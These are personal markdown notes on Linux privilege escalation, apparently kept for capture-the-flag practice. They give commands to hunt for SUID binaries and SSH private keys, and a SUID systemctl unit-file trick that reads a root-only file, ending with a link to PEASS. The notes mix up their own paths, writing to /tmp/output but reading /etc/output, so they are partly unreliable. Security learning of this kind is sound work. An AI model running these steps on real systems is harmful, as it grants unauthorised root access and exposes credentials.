---
pinned: true
tags: [Tips]
title: Linux Privilege Escalation Tips
created: '2020-05-03T16:33:51.947Z'
modified: '2020-05-15T19:04:41.708Z'
---

# Linux Privilege Escalation Tips

Search for files owned by a given user starting on / and redirect the errors to /dev/null

```
find / -user <username> -type f 2>/dev/null
```

---

Search for files with the SUID bit enabled starting on / and redirect the errors to /dev/null

```
find / -perm /4000 2>/dev/null
find / -perm /4000 -type f -exec ls -ld {} \; 2>/dev/null
```

---

Search for readable SSH private keys (`id_rsa`) in all the users directories

```
find / -name id_rsa -type f -exec ls -ld {} \; 2>/dev/null
```

### SUID

#### Systemctl

[GTFOBins - Systemctl](https://gtfobins.github.io/gtfobins/systemctl/)

Systemd initializes user space components that run after the Linux kernel has booted, as well as continuously maintaining those components throughout a system’s lifecycle. These tasks are known as units, and each unit has a corresponding unit file. We can create our own unit file and let systemd start it. Normally systemctl will look for unit files in the default folder, which is /etc/system/systemd. But we don’t have the permission to write to that folder. Instead, we can use an environment variable that will read the contents of **/root/root.txt** and write its output to **/tmp/output** file.

First we create a variable which holds a unique file.

```
eop=$(mktemp).service
```

Then we create an unit file and write it into the variable.

```
echo '[Service]
ExecStart=/bin/sh -c "cat /root/root.txt > /tmp/output"
[Install]
WantedBy=multi-user.target' > $eop
```

Inside the unit file we entered a command which will let shell execute the command cat and redirect the output of cat to a file called output in the folder tmp. And finally we use the /bin/systemctl program to enable the unit file.

```
/bin/systemctl link $eop
/bin/systemctl enable --now $eop
```

Finally we read the contents of the file **/etc/output**

## Automatic PE scripts

PEASS (Privilege Escalation Awesome Scripts SUITE)

[PEASS Github](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite)
